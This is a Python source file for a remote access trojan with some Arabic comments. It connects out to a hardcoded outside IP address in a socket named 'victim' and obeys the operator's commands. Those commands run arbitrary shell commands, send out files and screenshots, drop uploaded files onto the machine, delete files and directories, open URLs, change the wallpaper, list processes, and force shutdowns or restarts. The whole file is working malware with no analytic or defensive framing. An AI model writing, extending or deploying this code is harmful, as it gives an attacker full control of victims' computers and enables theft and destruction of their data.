import socket
import subprocess
import os
import webbrowser
import struct
import tempfile
import ctypes
import shutil
from PIL import ImageGrab
import io
import time
import psutil

def send_msg(sock, msg):
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    raw_msglen = recv_all(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recv_all(sock, msglen)

def recv_all(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def set_wallpaper(file_path):
    try:
        abs_path = os.path.abspath(file_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
        return "Wallpaper changed successfully"
    except Exception as e:
        return f"Error changing wallpaper: {str(e)}"

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_temp_{int(time.time())}.png")
        screenshot.save(temp_path, format='PNG')
        
        with open(temp_path, 'rb') as f:
            screenshot_data = f.read()
        
        os.remove(temp_path)
        return screenshot_data
    except Exception as e:
        return f"Error taking screenshot: {str(e)}".encode()

def list_processes():
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name']):
            procs.append(f"{p.info['pid']}: {p.info['name']}")
        return "\n".join(procs)
    except Exception as e:
        return f"Process error: {str(e)}"


ip = "147.185.221.27"
port = 41930

victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
victim.connect((ip, port))

while True:
    command_data = recv_msg(victim)
    if not command_data:
        break
        
    command = command_data.decode()
    
    if command == 'exit':
        break
        
    if command.startswith("cd "):
        try:
            os.chdir(command[3:])
            send_msg(victim, f"Directory changed to: {os.getcwd()}".encode())
        except Exception as e:
            send_msg(victim, f"Error: {str(e)}".encode())
            
    elif command.startswith("download "):
        file_path = command[9:]
        try:
            if os.path.exists(file_path):
                send_msg(victim, b'FILE')
                file_size = os.path.getsize(file_path)
                send_msg(victim, str(file_size).encode())
                
                with open(file_path, 'rb') as f:
                    while True:
                        data = f.read(4096)
                        if not data:
                            break
                        send_msg(victim, data)
            else:
                send_msg(victim, "Error: File not found".encode())
        except Exception as e:
            send_msg(victim, f"Error: {str(e)}".encode())

    elif command.startswith("bg "):
        try:
            file_path = command[3:]
            if os.path.exists(file_path):
                temp_dir = tempfile.gettempdir()
                temp_path = os.path.join(temp_dir, os.path.basename(file_path))
                shutil.copy2(file_path, temp_path)
                
                result = set_wallpaper(temp_path)
                send_msg(victim, f"Wallpaper changed | Temp: {temp_path} | {result}".encode())
                os.remove(temp_path)
            else:
                send_msg(victim, "Error: File not found".encode())
        except Exception as ex:
            send_msg(victim, f"Error: {str(ex)}".encode())
            
    elif command.startswith("url "):
        url = command[3:]
        webbrowser.open(str(url))
        send_msg(victim, f"Done Open Web : {url}".encode())

    elif command == 'screenshot':
        try:
            screenshot_data = take_screenshot()
            if screenshot_data:
                # First send the SCREENSHOT header
                send_msg(victim, b'SCREENSHOT')
                
                # Then send the size (using regular send to avoid double length prefix)
                victim.sendall(struct.pack('>I', len(screenshot_data)))
                
                # Finally send the raw image data
                victim.sendall(screenshot_data)
            else:
                send_msg(victim, b"Error: Failed to capture screenshot")
        except Exception as e:
            send_msg(victim, f"Error: {str(e)}".encode())

    elif command == 'UPLOAD_START':
        try:
            # استقبال اسم الملف
            file_name = recv_msg(victim).decode()
            
            # استقبال حجم الملف
            file_size = int(recv_msg(victim).decode())
            
            # حفظ الملف في المسار الحالي
            save_path = os.path.join(os.getcwd(), file_name)
            
            # استقبال محتوى الملف
            with open(save_path, 'wb') as f:
                remaining = file_size
                while remaining > 0:
                    data = recv_msg(victim)
                    if not data:
                        break
                    f.write(data)
                    remaining -= len(data)
            
            send_msg(victim, f"File received successfully: {save_path}".encode())
        except Exception as e:
            send_msg(victim, f"Upload failed: {str(e)}".encode())

    elif command.startswith("shutdown "):
        try:
            timeout = command[9:].strip()
            if timeout.isdigit():
                os.system(f"shutdown /s /f /t {timeout}")
                send_msg(victim, f"System will shutdown in {timeout} seconds".encode())
            else:
                send_msg(victim, b"Error: Invalid timeout value (must be number)")
        except Exception as e:
            send_msg(victim, f"Shutdown error: {str(e)}".encode())


    elif command.startswith("restart "):
        try:
            timeout = command[8:].strip()
            if timeout.isdigit():
                os.system(f"shutdown /r /f /t {timeout}")
                send_msg(victim, f"System will restart in {timeout} seconds".encode())
            else:
                send_msg(victim, b"Error: Invalid timeout value (must be number)")
        except Exception as e:
            send_msg(victim, f"Restart error: {str(e)}".encode())

    elif command == 'shutdown_abort':
        os.system("shutdown /a")
        send_msg(victim, b"Shutdown aborted")

    elif command == 'action_list':
        send_msg(victim, list_processes().encode())


    elif command.startswith("remove "):

        try:
            path = command[7:]

            shutil.rmtree(path) if os.path.isdir(path) else os.remove(path)

            result3 = f"Done Remove {path} Succssfully!"
            send_msg(victim, result3.encode())

        except Exception as ex:
             send_msg(victim, f"Remove failed: {str(ex)}".encode())

        


    else:
        try:
            output = subprocess.getoutput(command)
            send_msg(victim, output.encode())
        except Exception as e:
            send_msg(victim, f"Error: {str(e)}".encode())

victim.close()